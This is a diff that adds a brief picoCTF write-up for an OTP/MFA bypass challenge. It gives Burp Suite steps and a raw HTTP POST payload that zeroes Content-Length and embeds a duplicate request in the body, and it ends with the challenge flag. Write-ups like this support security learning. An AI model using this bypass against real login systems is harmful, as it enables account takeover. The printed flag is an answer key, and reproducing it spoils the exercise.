@@ -1,0 +1,44 @@
+intercept url requests from burpsuite
+
+1. go to http://titan.picoctf.net:56695
+2. Register with random details
+3. enter any otp for MFA
+4. Intercept the MFA request and update the Content-Length to 0, and copy paste the same request in place of the POST request body
+
+```
+
+POST /dashboard HTTP/1.1
+Host: titan.picoctf.net:56695
+User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://titan.picoctf.net:56695/dashboard
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+Origin: http://titan.picoctf.net:56695
+Connection: close
+Cookie: session=.eJxVjEkOwyAQBP_COQfAg8eTz1gsg2LFLAJbURTl7-HoHLu6uz7Cb8db3IUNacviJnxvcT3Kk_OAgJ7QISqtQWqiCKhkUCSdcmaCCLwYuzgev3ju-5pt4ourHHUkMjSDGbHa3l-lhcuiPkrmNZ_JcRtY6QnMjAvJ0Z2d25_w-wNyTjPA.ZfCxBA.JdpMcGPtx2gRiCFXeYWqFe8nUYg
+Upgrade-Insecure-Requests: 1
+
+POST /dashboard HTTP/1.1
+Host: titan.picoctf.net:56695
+User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://titan.picoctf.net:56695/dashboard
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+Origin: http://titan.picoctf.net:56695
+Connection: close
+Cookie: session=.eJxVjEkOwyAQBP_COQfAg8eTz1gsg2LFLAJbURTl7-HoHLu6uz7Cb8db3IUNacviJnxvcT3Kk_OAgJ7QISqtQWqiCKhkUCSdcmaCCLwYuzgev3ju-5pt4ourHHUkMjSDGbHa3l-lhcuiPkrmNZ_JcRtY6QnMjAvJ0Z2d25_w-wNyTjPA.ZfCxBA.JdpMcGPtx2gRiCFXeYWqFe8nUYg
+Upgrade-Insecure-Requests: 1
+
+otp=123456
+```
+
+Flag:
+
+picoCTF{#0TP_Bypvss_SuCc3$S_6bffad21}
+
